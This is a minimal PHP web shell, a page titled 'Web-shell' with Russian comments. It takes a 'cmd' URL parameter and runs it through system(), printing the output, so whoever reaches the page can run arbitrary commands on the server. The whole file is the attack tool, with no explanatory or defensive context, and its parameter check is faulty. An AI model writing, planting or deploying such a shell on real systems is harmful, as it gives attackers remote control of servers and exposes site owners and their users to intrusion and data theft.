<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web-shell</title>
</head>
<body>
<?php
    // Проверка на корректность заданного параметра

        if (empty(isset($_GET['cmd']))) {
            // Параметр пуст - выводим сообщение
            print(nl2br("Argument is not specified."));
        }else
            // Выводим результат выполненной команды
            system($_GET['cmd']);
        
?>
</body>
</html>